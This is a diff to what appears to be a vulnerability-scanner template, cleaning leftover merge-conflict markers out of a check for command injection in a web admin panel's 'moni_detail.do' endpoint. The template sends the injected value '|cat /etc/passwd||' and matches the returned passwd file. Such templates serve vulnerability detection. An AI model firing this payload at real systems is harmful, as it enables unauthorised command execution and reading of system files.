@@ -17,16 +17,6 @@ requests:
       - |
         POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
         Host: {{Hostname}}
-<<<<<<< HEAD
-<<<<<<< HEAD
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chro·me/89.0.4389.114 Safari/537.36
-        Content-Length: 25
-        Cache-Control: max-age=0
-        Upgrade-Insecure-Requests: 1
-=======
->>>>>>> 5d36d276 (add new stuff)
-=======
->>>>>>> 18ddf72b (add new stuff)
         Content-Type: application/x-www-form-urlencoded
 
         type='|cat /etc/passwd||'
@@ -35,15 +25,7 @@ requests:
     matchers:
       - type: regex
         regex:
-<<<<<<< HEAD
-<<<<<<< HEAD
-          - "root:[x*]:0:0"
-=======
-          - "root:.*:0:0"
->>>>>>> 5d36d276 (add new stuff)
-=======
           - "root:.*:0:0:"
->>>>>>> 18ddf72b (add new stuff)
         part: body
 
       - type: status
